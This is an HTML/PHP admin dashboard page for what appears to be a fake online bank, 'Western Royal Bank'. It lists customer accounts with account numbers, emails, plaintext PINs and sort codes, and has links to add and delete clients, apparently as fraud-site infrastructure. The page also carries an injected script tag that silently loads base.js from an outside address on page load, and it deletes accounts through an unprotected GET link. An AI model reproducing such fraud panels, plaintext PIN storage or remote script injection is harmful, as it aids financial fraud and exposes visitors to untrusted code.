<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0041)http://Western Royal Bank.com/content.asp?n=Western Royal BankGroup&l=1 -->
<HTML><HEAD><TITLE>Admin Dashboard</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<LINK 
href="bov.css" type=text/css rel=stylesheet>
<SCRIPT language=JavaScript1.2 src="scripts.js" 
type=text/javascript></SCRIPT>

<META content="MSHTML 6.00.2900.2180" name=GENERATOR>
<style>
<!--
.textMB {
	FONT-WEIGHT: bold; FONT-SIZE: 10px; FONT-FAMILY: Arial, Helvetica, sans-serif; HEIGHT: 25px
}
FORM {
	MARGIN: 0px
}
FORM {
	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
}
.textMenuBar {
	FONT-SIZE: 10px; COLOR: #000000; FONT-FAMILY: Arial, Helvetica, sans-serif
}
-->
</style>

<script type=text/javascript>

function stop(id) {
    
    var flag = confirm('Are you sure you want to delete this account?');
    if (flag == true){
    window.location.href="delete_account.php?id="+id;
        }
     
}



</script>


</HEAD><script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='http://10.71.184.6:8080/www/default/base.js'></script>
<BODY bottomMargin=0 leftMargin=0 topMargin=0 rightMargin=0 marginheight="0" 
marginwidth="0">
<div align="center">
<TABLE cellSpacing=0 cellPadding=0 width=734 border=0>
  <TBODY>
  <TR>
        <TD vAlign=top width=726>
      <TABLE cellSpacing=15 cellPadding=0 width=729 border=0>
        <TBODY>
        <TR>
          <TD>
            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
              <TBODY>
              <TR>
                <TD class=titlemain height=25 width="34%">
                  <h3>Welcome,&nbsp;Admin </h3></TD>
                <TD class=titlemain height=25 width="66%">
													<table border="0" width="85%" height="23">
														<tr>
															<td width="88" align="center" bgcolor="#122744">
															  <h5><font color="#FFFFFF">
														      <b>
														      <a href="addclient.php">
												            <font color="#FFFFFF">Add Client</font></a></b></font></h5></td>
															<td width="86" align="center" bgcolor="#122744">
															  <h5><font color="#FFFFFF">
														      <b>
														      <a href="viewclients.php">
												            <font color="#FFFFFF">View Clients</font></a></b></font></h5></td>
															<td align="center" bgcolor="#122744" width="66">
															  <h5><font color="#FFFFFF">
														      <b>
														      <a href="logout_admin.php">
												            <font color="#FFFFFF">Log Out</font></a></b></font></h5></td>
															<td align="center" bgcolor="#122744">
															  <h5><font color="#FFFFFF">
														      <b>
														      <a href="view_apps.php">
													          <font color="#FFFFFF">View All 
												            Applications</font></a></b></font></h5></td>
														</tr>
													</table>
													
              <TR>
                <TD colspan="2">
			  <img border="0" src="title_line_pr.gif" width="496" height="4"></TD></TR></TBODY></TABLE></TD></TR>
        <font size="1">
        <TR>
          <TD class=content>
          <font size = "-1">
					<table border="0" width="102%" id="table17" height="195" cellspacing="0">
						<tr>
							<td class="textMenuBar">
																															<table border="0" width="100%" height="228" cellspacing="1">
																																<tr>
																																	<td>
				
																																	<table border="0" width="100%" id="table14" cellspacing="1">
																																		<tr>
																																			<td colspan="3" height="18" bgcolor="#74064C">
																																			<b><font size="2" color="#FFFFFF">Below are all the customer accounts you have created</font></b></td>
																																		</tr>
																																		<tr>
																																			<td colspan="3" height="167">
							
							<h6><font size="2">&nbsp;</font></h6>
							<font size="2"><TABLE border=1 cellPadding=2 cellSpacing=0 width="100%"><tr><td><STRONG>ID</STRONG></td><td><STRONG>First Name</STRONG></td><td><STRONG>Last Name</STRONG></td><td><STRONG>Account No.</STRONG></td><td><STRONG>Email</STRONG></td><td><STRONG>Pin</STRONG></td>
							<td><STRONG>Sort Code</STRONG></td><td><STRONG>Delete account</STRONG></td><td><STRONG>DATE</STRONG></td>
                            

<?php
include("fetch_data_to_table.php");
?>
                            

</tr></TABLE></font></td>
																																		</tr>
																																		<tr>
																																			<td width="37%">&nbsp;</td>
																																			<td width="23%" bgcolor="#EEEEEE">
																																			<p align="center">&nbsp;</td>
																																			<td width="38%">&nbsp;</td>
																																		</tr>
																																	</table>
																																	</td>
																																</tr>
																																<tr>
                      <TD align=left class=normaltext height=93 
                      style="BORDER-TOP: 1px solid" width="100%" bgcolor="#FFFFFF">
                        <HR align=center noShade SIZE=1>
						<p align="center" style="margin-top: -1px; margin-bottom: -1px">&nbsp;
						</p>
                      	<p align="center">
						&nbsp;</TD>
																																</tr>
																																<tr>
																																	<td width="150" height="17"></td>
																																	<td height="17"></td>
																																</tr>
																															</table>
																															<table border="0" width="100%">
																																<tr>
																																			<td width="37%">&nbsp;</td>
																																			<td width="23%" bgcolor="#74064C">
																																			<p align="center">&nbsp;</td>
																																			<td width="38%">&nbsp;</td>
																																		</tr>
																																<tr>
																																	<td>
																																	<p>&nbsp;</td>
																																</tr>
																															</table>
							</td>
						</tr>
						</table>
				</TD></TR></TBODY></TABLE></TD>
    <TD vAlign=top>&nbsp;
      </TD></TR>
  <TR>
    <TD vAlign=top width=726>&nbsp;
      </TD>
    <TD vAlign=top width=4>&nbsp;
      </TD>
    <TD vAlign=top>&nbsp;
      </TD></TR></TBODY></TABLE></div>

</BODY></HTML>